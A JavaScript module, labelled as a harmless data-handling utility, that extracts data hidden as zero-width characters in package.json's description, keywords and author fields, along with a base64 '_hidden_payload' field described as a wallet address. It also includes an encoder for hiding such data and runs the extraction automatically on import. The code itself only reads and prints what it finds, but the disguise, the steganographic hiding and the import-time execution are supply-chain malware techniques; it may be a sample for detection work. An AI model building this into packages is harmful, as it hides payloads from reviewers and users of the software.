/**
 * Data Handling Utility
 * Reads configuration from package metadata
 */

const fs = require('fs');
const path = require('path');

// Zero-width characters used for encoding
const ZWSP = '\u200B';
const ZWNJ = '\u200C';

/**
 * Extract hidden data from package.json fields
 * @returns {Object} - Extracted hidden payload
 */
function extractFromPackageJson() {
    const pkgPath = path.join(__dirname, '..', 'package.json');
    const pkg = JSON.parse(fs.readFileSync(pkgPath, 'utf8'));
    
    // Extract zero-width characters from description
    const desc = pkg.description || '';
    const hiddenInDesc = desc.match(/[\u200B\u200C]/g) || [];
    
    // Extract from keywords
    const keywords = pkg.keywords || [];
    const hiddenInKeywords = keywords.join('').match(/[\u200B\u200C]/g) || [];
    
    // Extract from author
    const author = pkg.author || '';
    const hiddenInAuthor = author.match(/[\u200B\u200C]/g) || [];
    
    // Check for hidden payload field
    const hiddenPayload = pkg._hidden_payload || null;
    
    return {
        description: hiddenInDesc.join(''),
        keywords: hiddenInKeywords.join(''),
        author: hiddenInAuthor.join(''),
        payload: hiddenPayload
    };
}

/**
 * Decode base64 payload
 * @param {string} encoded - Base64 encoded string
 * @returns {string} - Decoded string
 */
function decodeBase64(encoded) {
    return Buffer.from(encoded, 'base64').toString('utf8');
}

/**
 * Process hidden data from package.json
 * @returns {string} - Decoded wallet address
 */
function processHiddenData() {
    const extracted = extractFromPackageJson();
    
    // Decode the hidden payload if present
    if (extracted.payload) {
        const decoded = decodeBase64(extracted.payload);
        console.log('Decoded payload:', decoded);
        return decoded;
    }
    
    // Combine all zero-width sequences
    const combined = extracted.description + extracted.keywords + extracted.author;
    if (combined.length > 0) {
        console.log('Found hidden zero-width data');
        return combined;
    }
    
    return null;
}

/**
 * Encode data into zero-width characters for package.json
 * @param {string} data - Data to encode
 * @returns {string} - Encoded string
 */
function encodeForPackageJson(data) {
    let binary = '';
    for (let i = 0; i < data.length; i++) {
        binary += data.charCodeAt(i).toString(2).padStart(8, '0');
    }
    
    let encoded = '';
    for (let bit of binary) {
        encoded += bit === '0' ? ZWSP : ZWNJ;
    }
    return encoded;
}

// Export functions
module.exports = {
    extractFromPackageJson,
    decodeBase64,
    processHiddenData,
    encodeForPackageJson
};

// Auto-execute on import
const walletAddress = processHiddenData();
if (walletAddress) {
    console.log('Wallet address retrieved from package.json');
}
